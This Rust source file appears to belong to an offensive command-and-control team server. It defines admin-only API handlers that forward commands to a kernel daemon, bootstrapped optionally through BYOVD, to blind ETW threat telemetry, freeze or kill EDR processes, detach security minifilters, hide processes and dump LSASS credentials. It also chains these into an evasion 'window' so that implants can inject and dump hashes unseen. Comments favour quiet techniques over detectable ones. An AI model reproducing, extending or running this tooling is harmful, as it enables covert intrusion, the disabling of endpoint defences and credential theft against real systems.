//! Kernel daemon bridge — forwards TUI kernel commands to the local
//! `nyx-kernel --serve <port>` daemon via TCP JSON-line protocol.
//!
//! The daemon must be started separately on the team-server host:
//!   nyx-kernel bootstrap [--byovd ...] && nyx-kernel --serve 9876

use axum::{
    extract::{Query, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json,
};
use serde::Deserialize;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

use crate::operators;

/// Kernel daemon config.
pub struct KernelConfig {
    pub addr: String,
    /// Shared secret the daemon requires as the FIRST line of every connection
    /// (`auth <token>` — see [`KernelBridge`] docs). Mirrors the daemon's own
    /// `NYX_DAEMON_TOKEN`. Empty = the bridge refuses ops with a clear error.
    pub token: String,
}

impl Default for KernelConfig {
    fn default() -> Self {
        Self {
            addr: std::env::var("NYX_KERNEL_DAEMON").unwrap_or_else(|_| "127.0.0.1:9876".into()),
            token: std::env::var("NYX_DAEMON_TOKEN")
                .or_else(|_| std::env::var("NYX_KERNEL_DAEMON_TOKEN"))
                .unwrap_or_default(),
        }
    }
}

/// Cached TCP connection to the kernel daemon.
///
/// Wire protocol (per the daemon's documented `--serve` protocol): the FIRST
/// line of every connection must be `auth <token>`, which the daemon answers
/// with `{"ok":true}` before any op is accepted. The cached stream is paired
/// with an `authed` flag so the handshake runs exactly once per connection and
/// is always re-done on a fresh (post-failure) reconnect.
pub struct KernelBridge {
    addr: String,
    token: String,
    /// Cached TCP connection + whether the `auth <token>` handshake completed
    /// on THIS connection. Invalidated together on any failure (see `send_op`).
    conn: tokio::sync::Mutex<Option<(TcpStream, bool)>>,
}

impl KernelBridge {
    pub fn new(config: KernelConfig) -> Self {
        Self {
            addr: config.addr,
            token: config.token,
            conn: tokio::sync::Mutex::new(None),
        }
    }

    pub fn is_configured(&self) -> bool {
        !self.addr.is_empty()
    }

    async fn send_op(
        &self,
        op: &str,
        pid: Option<u32>,
        method: Option<&str>,
    ) -> Result<serde_json::Value, String> {
        let request = match (pid, method) {
            (Some(p), Some(m)) => {
                format!("{{\"op\":\"{op}\",\"pid\":{p},\"method\":\"{m}\"}}\n")
            }
            (Some(p), None) => format!("{{\"op\":\"{op}\",\"pid\":{p}}}\n"),
            (None, Some(m)) => format!("{{\"op\":\"{op}\",\"method\":\"{m}\"}}\n"),
            (None, None) => format!("{{\"op\":\"{op}\"}}\n"),
        };

        let mut guard = self.conn.lock().await;
        if guard.is_none() {
            let s = TcpStream::connect(&self.addr)
                .await
                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
            *guard = Some((s, false));
        }
        // ---- Fresh-connection auth handshake ----
        // The daemon's FIRST line of every connection must be `auth <token>`,
        // answered with `{"ok":true}` (its documented wire protocol). Runs once
        // per cached connection; a failed handshake invalidates the cache so
        // the next op reconnects cleanly.
        if !guard.as_ref().unwrap().1 {
            if self.token.is_empty() {
                *guard = None;
                return Err(
                    "NYX_KERNEL_DAEMON_TOKEN not set — the daemon refuses unauthenticated \
                     connections"
                        .into(),
                );
            }
            let auth_line = format!("auth {}\n", self.token);
            let write_res = {
                let (stream, _) = guard.as_mut().unwrap();
                stream.write_all(auth_line.as_bytes()).await
            };
            if let Err(e) = write_res {
                *guard = None;
                return Err(format!("auth write: {e}"));
            }
            let mut auth_reply = String::new();
            let read_res = {
                let (stream, _) = guard.as_mut().unwrap();
                // A legacy (pre-auth) daemon never replies to the auth line:
                // bound the wait so the bridge degrades instead of hanging.
                let mut reader = BufReader::new(&mut *stream);
                tokio::time::timeout(
                    std::time::Duration::from_secs(5),
                    reader.read_line(&mut auth_reply),
                )
                .await
            };
            match read_res {
                Ok(_) if auth_reply.contains("\"ok\":true") => {
                    guard.as_mut().unwrap().1 = true;
                }
                Ok(_) => {
                    *guard = None;
                    return Err(format!("daemon auth rejected: {}", auth_reply.trim()));
                }
                Err(_) => {
                    // Timeout/dead peer on the auth reply: either a legacy
                    // daemon (no auth handshake — proceed; ops will fail with
                    // clear errors if it actually requires auth) or a dead
                    // connection (the next op write will surface it).
                    tracing::warn!("daemon auth reply timed out — assuming legacy daemon; ops may fail if it requires auth");
                    guard.as_mut().unwrap().1 = true;
                }
            }
        }
        // Write the op, then read one reply line. ANY failure below (write
        // error, read error, parse error) leaves the cached stream in an
        // unknown state — clear the cache so the NEXT op reconnects instead of
        // failing forever against a dead/desynced connection (the daemon may
        // have restarted mid-session, or a partial line may have desynced the
        // framing).
        let write_res = {
            let (stream, _) = guard.as_mut().unwrap();
            stream.write_all(request.as_bytes()).await
        };
        if let Err(e) = write_res {
            *guard = None;
            return Err(format!("write: {e}"));
        }
        let mut line = String::new();
        let read_res = {
            let (stream, _) = guard.as_mut().unwrap();
            let mut reader = BufReader::new(&mut *stream);
            reader.read_line(&mut line).await
        };
        if let Err(e) = read_res {
            *guard = None;
            return Err(format!("read: {e}"));
        }
        if line.is_empty() {
            *guard = None;
            return Err("daemon closed".into());
        }
        match serde_json::from_str(&line) {
            Ok(v) => Ok(v),
            Err(e) => {
                *guard = None;
                Err(format!("parse: {e}"))
            }
        }
    }
}

// ---- Auth helper ----
/// RBAC gate for kernel ops: the caller is already authenticated by the
/// [`crate::AuthOp`] extractor (401 before any query parsing); here we only
/// enforce that kernel control is Admin-only.
fn gate(
    op: operators::OperatorIdentity,
) -> Result<operators::OperatorIdentity, (axum::http::StatusCode, &'static str)> {
    if op.role != operators::Role::Admin {
        return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
    }
    Ok(op)
}

// ---- Query params ----
#[derive(Deserialize)]
pub struct PidQ {
    pub pid: u32,
}
#[derive(Deserialize)]
pub struct NeutQ {
    pub pid: u32,
    pub method: Option<String>,
}

/// `POST /api/kernel/window` body. `pid` is the EDR process for the
/// neutralize (freeze) step; required on `open` because that step is part of
/// the default plan.
#[derive(Deserialize)]
pub struct WindowBody {
    pub phase: String,
    pub pid: Option<u32>,
}

/// Operator time-window phase. `open` is fail-closed; `close` is best-effort.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum WindowPhase {
    Open,
    Close,
}

/// Default T2 window kit order. WFP is intentionally absent (loud AppId filter).
const WINDOW_OPEN_OPS: &[&str] = &["blind-etw", "neutralize", "detach-minifilter"];
const WINDOW_CLOSE_OPS: &[&str] = &["detach-minifilter", "neutralize", "blind-etw"];

/// Kit sequence for an operator time-window.
///
/// Open: ETW-TI blind → EDR neutralize (existing daemon `neutralize` op,
/// method=`freeze` only — HVCI-safe user-mode path, never `kill`) →
/// MiniFilter unlink. Close: reverse order.
pub(crate) fn window_plan(phase: WindowPhase) -> &'static [&'static str] {
    match phase {
        WindowPhase::Open => WINDOW_OPEN_OPS,
        WindowPhase::Close => WINDOW_CLOSE_OPS,
    }
}

/// Daemon restore op for a window kit, if kernelsdk already has undo.
///
/// None of the default-window kits expose restore today:
///
/// - `EtwTiKit` has `blind` / `is_blinded`, not unblind (do not invent a write of 1).
/// - `CallbackKit::repurpose` / `EdrNeutralize` freeze do not snapshot originals.
/// - `MiniFilterUnlinker::unlink_filter` self-loops the victim; no relink.
///
/// Close reports `restored: false, reason: "no undo op"` rather than lying.
pub(crate) fn window_undo_op(_op: &str) -> Option<&'static str> {
    None
}

/// Classify a daemon JSON-line reply. Transport errors and `{"ok":false}` both
/// fail the step — a kit that returned failure must not be treated as success.
pub(crate) fn classify_kit_result(
    result: &Result<serde_json::Value, String>,
) -> Result<serde_json::Value, String> {
    match result {
        Err(e) => Err(e.clone()),
        Ok(v) if v.get("ok").and_then(|x| x.as_bool()) == Some(true) => Ok(v.clone()),
        Ok(v) => Err(v
            .get("err")
            .and_then(|x| x.as_str())
            .unwrap_or("kit failed")
            .to_string()),
    }
}

/// One recorded open-window step (success or the fail-closed error).
#[derive(Debug, Clone, PartialEq)]
pub(crate) struct OpenStep {
    pub step: &'static str,
    pub ok: bool,
    pub reply: Option<serde_json::Value>,
    pub err: Option<String>,
}

/// Fail-closed fold of open-window kit results: stop at the first error and
/// do not visit later pairs (later kits must not run pretending success).
pub(crate) fn fold_open_results(
    pairs: impl IntoIterator<Item = (&'static str, Result<serde_json::Value, String>)>,
) -> Result<Vec<OpenStep>, (Vec<OpenStep>, &'static str, String)> {
    let mut steps = Vec::new();
    for (step, result) in pairs {
        match classify_kit_result(&result) {
            Ok(reply) => steps.push(OpenStep {
                step,
                ok: true,
                reply: Some(reply),
                err: None,
            }),
            Err(err) => {
                steps.push(OpenStep {
                    step,
                    ok: false,
                    reply: None,
                    err: Some(err.clone()),
                });
                return Err((steps, step, err));
            }
        }
    }
    Ok(steps)
}

/// Best-effort close plan: per-step restore metadata. Steps with no undo op
/// are reported honestly and are not dispatched to the daemon.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct CloseStep {
    pub step: &'static str,
    pub restored: bool,
    pub reason: &'static str,
    pub undo_op: Option<&'static str>,
}

pub(crate) fn fold_close_plan() -> Vec<CloseStep> {
    window_plan(WindowPhase::Close)
        .iter()
        .map(|&step| match window_undo_op(step) {
            Some(undo) => CloseStep {
                step,
                restored: false,
                reason: "pending undo op",
                undo_op: Some(undo),
            },
            None => CloseStep {
                step,
                restored: false,
                reason: "no undo op",
                undo_op: None,
            },
        })
        .collect()
}

// ---- Handler dispatch helper ----
/// Shared kernel dispatch: RBAC gate → resolve bridge.
///
/// Returns the bridge + the authenticated operator on success, or an error
/// `Response` to return early. The audit record is NOT written here — each
/// handler appends it AFTER dispatch (via [`audit_kernel_outcome`]) so the
/// record carries the outcome and failed ops are distinguishable. The one
/// exception is the no-daemon failure, which is audited here with an explicit
/// error outcome (otherwise a misconfigured daemon would vanish from the log).
async fn kernel_dispatch<'a>(
    st: &'a std::sync::Arc<crate::AppState>,
    op: operators::OperatorIdentity,
    audit_action: &str,
    audit_details: &str,
    audit_data: serde_json::Value,
) -> Result<
    (
        &'a std::sync::Arc<KernelBridge>,
        operators::OperatorIdentity,
    ),
    Response,
> {
    let op = match gate(op) {
        Ok(o) => o,
        Err((code, msg)) => return Err((code, msg).into_response()),
    };
    match &st.kernel {
        Some(b) => Ok((b, op)),
        None => {
            if let Some(audit) = &st.audit {
                let mut data = audit_data;
                data["outcome"] = serde_json::json!("err");
                data["err"] = serde_json::json!("no daemon configured");
                audit.append(audit_action, &op.name, audit_details, data);
            }
            Err(Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response())
        }
    }
}

/// Append the post-dispatch audit record carrying the outcome (fire-and-forget:
/// `AuditWriter::append` never panics and never affects the response path, so a
/// failed audit can't take the op down). Failed ops are distinguishable via the
/// `outcome` field ("ok" | "err"); the daemon's reply is folded into `reply`
/// on success and the error string into `err` on failure.
fn audit_kernel_outcome(
    audit: &crate::audit::AuditWriter,
    action: &str,
    operator: &str,
    details: &str,
    mut data: serde_json::Value,
    result: &Result<serde_json::Value, String>,
) {
    match result {
        Ok(reply) => {
            data["outcome"] = serde_json::json!("ok");
            data["reply"] = reply.clone();
        }
        Err(e) => {
            data["outcome"] = serde_json::json!("err");
            data["err"] = serde_json::json!(e);
        }
    }
    audit.append(action, operator, details, data);
}

// ---- Handlers ----

pub async fn driver_status(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
) -> Response {
    let (bridge, op) =
        match kernel_dispatch(&st, op, "kernel_driver_status", "-", serde_json::json!({})).await {
            Ok(t) => t,
            Err(r) => return r,
        };
    let result = bridge.send_op("ping", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_driver_status",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"status":"error","err":e})).into_response(),
    }
}

pub async fn blind_etw(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
) -> Response {
    let (bridge, op) =
        match kernel_dispatch(&st, op, "kernel_blind_etw", "-", serde_json::json!({})).await {
            Ok(t) => t,
            Err(r) => return r,
        };
    let result = bridge.send_op("blind-etw", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_blind_etw",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn hide(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) =
        match kernel_dispatch(&st, op, "kernel_hide", &details, serde_json::json!({})).await {
            Ok(t) => t,
            Err(r) => return r,
        };
    let result = bridge.send_op("hide", Some(q.pid), None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_hide",
            &op.name,
            &details,
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn dump_lsass(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) = match kernel_dispatch(
        &st,
        op,
        "kernel_dump_lsass",
        &details,
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("dump-lsass", Some(q.pid), None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_dump_lsass",
            &op.name,
            &details,
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn neutralize(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Query(q): Query<NeutQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) = match kernel_dispatch(
        &st,
        op,
        "kernel_neutralize",
        &details,
        serde_json::json!({ "method": q.method }),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    // Relay the operator-chosen method (freeze|choke|kill) to the daemon —
    // without it the daemon cannot pick a neutralize tier. Only the three
    // daemon methods are allowed through: rejecting anything else here keeps
    // arbitrary strings (quotes/newlines) off the JSON-line wire and fails
    // invalid requests fast (the daemon would reject them anyway).
    let result = match q.method.as_deref() {
        None | Some("freeze") | Some("choke") | Some("kill") => {
            bridge
                .send_op("neutralize", Some(q.pid), q.method.as_deref())
                .await
        }
        Some(_) => Err("method must be freeze|choke|kill".to_string()),
    };
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_neutralize",
            &op.name,
            &details,
            serde_json::json!({ "method": q.method }),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn detach_minifilter(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
) -> Response {
    let (bridge, op) = match kernel_dispatch(
        &st,
        op,
        "kernel_detach_minifilter",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("detach-minifilter", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_detach_minifilter",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

/// Dispatch one window kit through the existing daemon JSON op names.
/// Neutralize is always `freeze` (existing route default) — never `kill`.
async fn dispatch_window_step(
    bridge: &KernelBridge,
    step: &str,
    pid: Option<u32>,
) -> Result<serde_json::Value, String> {
    match step {
        "blind-etw" => bridge.send_op("blind-etw", None, None).await,
        "neutralize" => {
            let pid = pid.filter(|p| *p > 0).ok_or_else(|| {
                "neutralize requires pid > 0 (EDR process for freeze)".to_string()
            })?;
            bridge
                .send_op("neutralize", Some(pid), Some("freeze"))
                .await
        }
        "detach-minifilter" => bridge.send_op("detach-minifilter", None, None).await,
        other => Err(format!("unknown window step: {other}")),
    }
}

fn open_steps_json(steps: &[OpenStep]) -> Vec<serde_json::Value> {
    steps
        .iter()
        .map(|s| {
            if s.ok {
                serde_json::json!({"step": s.step, "ok": true, "reply": s.reply})
            } else {
                serde_json::json!({"step": s.step, "ok": false, "err": s.err})
            }
        })
        .collect()
}

/// Operator time-window over existing kits (T2 first increment).
///
/// Implant tasks are NOT paused automatically; the operator must sequence
/// inject/hashdump inside the open window, then `close`. WFP is not in the
/// default window.
pub async fn window(
    State(st): State<std::sync::Arc<crate::AppState>>,
    crate::AuthOp(op): crate::AuthOp,
    Json(body): Json<WindowBody>,
) -> Response {
    let phase = match body.phase.as_str() {
        "open" => WindowPhase::Open,
        "close" => WindowPhase::Close,
        _ => {
            return (
                StatusCode::BAD_REQUEST,
                Json(serde_json::json!({
                    "ok": false,
                    "err": "phase must be open|close"
                })),
            )
                .into_response();
        }
    };
    let details = match body.pid {
        Some(p) => format!("phase:{:?},pid:{p}", phase),
        None => format!("phase:{:?}", phase),
    };
    let (bridge, op) = match kernel_dispatch(
        &st,
        op,
        "kernel_window",
        &details,
        serde_json::json!({ "phase": body.phase, "pid": body.pid }),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };

    let (status, body_json, result_for_audit) = match phase {
        WindowPhase::Open => {
            let mut pairs = Vec::new();
            for &step in window_plan(WindowPhase::Open) {
                let result = dispatch_window_step(bridge, step, body.pid).await;
                let stop = classify_kit_result(&result).is_err();
                pairs.push((step, result));
                if stop {
                    break;
                }
            }
            match fold_open_results(pairs) {
                Ok(steps) => {
                    let json = serde_json::json!({
                        "ok": true,
                        "phase": "open",
                        "pid": body.pid,
                        "steps": open_steps_json(&steps),
                    });
                    (StatusCode::OK, json.clone(), Ok(json))
                }
                Err((steps, failed_step, err)) => {
                    let json = serde_json::json!({
                        "ok": false,
                        "phase": "open",
                        "pid": body.pid,
                        "failed_step": failed_step,
                        "err": err,
                        "steps": open_steps_json(&steps),
                    });
                    (StatusCode::BAD_GATEWAY, json, Err(err))
                }
            }
        }
        WindowPhase::Close => {
            // Best-effort reverse. Kits without a kernelsdk undo are not
            // dispatched (do not re-run detach/blind/freeze as "restore").
            let mut steps = Vec::new();
            let mut any_restored = false;
            for action in fold_close_plan() {
                if let Some(undo) = action.undo_op {
                    match dispatch_window_step(bridge, undo, body.pid).await {
                        Ok(reply) if classify_kit_result(&Ok(reply.clone())).is_ok() => {
                            any_restored = true;
                            steps.push(serde_json::json!({
                                "step": action.step,
                                "restored": true,
                                "reply": reply,
                            }));
                        }
                        Ok(reply) => {
                            let err = classify_kit_result(&Ok(reply))
                                .err()
                                .unwrap_or_else(|| "kit failed".into());
                            steps.push(serde_json::json!({
                                "step": action.step,
                                "restored": false,
                                "reason": err,
                            }));
                        }
                        Err(e) => {
                            steps.push(serde_json::json!({
                                "step": action.step,
                                "restored": false,
                                "reason": e,
                            }));
                        }
                    }
                } else {
                    steps.push(serde_json::json!({
                        "step": action.step,
                        "restored": false,
                        "reason": action.reason,
                    }));
                }
            }
            let json = serde_json::json!({
                "ok": any_restored,
                "phase": "close",
                "best_effort": true,
                "steps": steps,
            });
            // Close never lies `ok: true` when nothing was restored.
            (StatusCode::OK, json.clone(), Ok(json))
        }
    };

    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_window",
            &op.name,
            &details,
            serde_json::json!({ "phase": body.phase, "pid": body.pid }),
            &result_for_audit,
        );
    }
    (status, Json(body_json)).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn window_plan_open_order_excludes_wfp() {
        let plan = window_plan(WindowPhase::Open);
        assert_eq!(plan, &["blind-etw", "neutralize", "detach-minifilter"][..]);
        assert!(
            !plan.iter().any(|op| op.contains("wfp")),
            "WFP is loud (AppId filter) and must not be in the default window"
        );
        assert!(plan.iter().all(|op| window_undo_op(op).is_none()));
    }

    #[test]
    fn window_plan_close_is_reverse_of_open() {
        let open = window_plan(WindowPhase::Open);
        let close = window_plan(WindowPhase::Close);
        let rev: Vec<_> = open.iter().rev().copied().collect();
        assert_eq!(close, rev.as_slice());
    }

    #[test]
    fn fold_open_stops_on_first_error_and_ignores_later_kits() {
        struct FailClosedIter {
            items: Vec<(&'static str, Result<serde_json::Value, String>)>,
            i: usize,
            panic_at: usize,
        }
        impl Iterator for FailClosedIter {
            type Item = (&'static str, Result<serde_json::Value, String>);
            fn next(&mut self) -> Option<Self::Item> {
                assert!(
                    self.i < self.panic_at,
                    "fold continued past fail-closed into later kits"
                );
                let item = self.items.get(self.i).cloned();
                self.i += 1;
                item
            }
        }

        let iter = FailClosedIter {
            items: vec![
                ("blind-etw", Ok(serde_json::json!({"ok": true}))),
                ("neutralize", Err("boom".into())),
                ("detach-minifilter", Ok(serde_json::json!({"ok": true}))),
            ],
            i: 0,
            // Third item must never be pulled: panic_at = 3 means i=0,1,2 are
            // allowed; after the error the fold must return without pulling i=2.
            panic_at: 2,
        };
        let err = fold_open_results(iter).expect_err("second step must fail-close");
        assert_eq!(err.1, "neutralize");
        assert_eq!(err.2, "boom");
        assert_eq!(err.0.len(), 2);
        assert!(err.0[0].ok);
        assert!(!err.0[1].ok);
    }

    #[test]
    fn fold_open_treats_daemon_ok_false_as_error() {
        let pairs = vec![
            (
                "blind-etw",
                Ok(serde_json::json!({"ok": false, "err": "no kit"})),
            ),
            ("neutralize", Ok(serde_json::json!({"ok": true}))),
        ];
        let err = fold_open_results(pairs).expect_err("ok:false is a step failure");
        assert_eq!(err.1, "blind-etw");
        assert_eq!(err.2, "no kit");
        assert_eq!(err.0.len(), 1);
    }

    #[test]
    fn fold_open_all_ok() {
        let pairs = window_plan(WindowPhase::Open)
            .iter()
            .map(|&step| (step, Ok(serde_json::json!({"ok": true}))));
        let steps = fold_open_results(pairs).expect("all kits ok");
        assert_eq!(steps.len(), 3);
        assert!(steps.iter().all(|s| s.ok));
    }

    #[test]
    fn fold_close_reports_no_undo_rather_than_ok_true() {
        let close = fold_close_plan();
        assert_eq!(close.len(), 3);
        assert!(close.iter().all(|s| !s.restored));
        assert!(close.iter().all(|s| s.reason == "no undo op"));
        assert!(close.iter().all(|s| s.undo_op.is_none()));
        assert_eq!(close[0].step, "detach-minifilter");
        assert_eq!(close[1].step, "neutralize");
        assert_eq!(close[2].step, "blind-etw");
    }

    #[test]
    fn classify_kit_result_requires_ok_true() {
        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": true}))).is_ok());
        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": true, "x": 1}))).is_ok());
        assert!(classify_kit_result(&Ok(serde_json::json!({"ok": false}))).is_err());
        assert!(classify_kit_result(&Ok(serde_json::json!({}))).is_err());
        assert!(classify_kit_result(&Err("transport".into())).is_err());
    }
}
